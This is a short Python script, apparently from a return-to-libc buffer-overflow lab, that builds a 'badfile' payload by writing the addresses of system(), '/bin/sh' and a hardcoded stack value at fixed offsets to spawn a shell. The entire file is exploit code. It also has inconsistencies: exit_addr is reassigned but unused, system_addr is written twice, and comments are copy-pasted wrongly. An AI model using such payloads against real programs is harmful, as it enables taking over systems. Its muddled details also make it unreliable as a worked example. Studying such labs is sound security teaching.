import sys


with open("addresses.txt", "r") as file:
   lines = file.readlines()
# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))
# Parse the addresses
# Parse the addresses
sh_addr = int(lines[0].strip(), 16)      # The address of "/bin/sh"
dash_addr = int(lines[1].strip(), 16)
system_addr = int(lines[2].strip(), 16) # The address of system()
exit_addr = int(lines[3].strip(), 16) # The address of system()
execv_addr = int(lines[4].strip(), 16)


X = 28
content[X:X+4] = (system_addr).to_bytes(4,byteorder='little')


Y = 32
exit_addr = 0xf7dbb460    # The address of exit()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')


Z = 36
content[Z:Z+4] = (0xffffdfa7).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
 f.write(content)
 
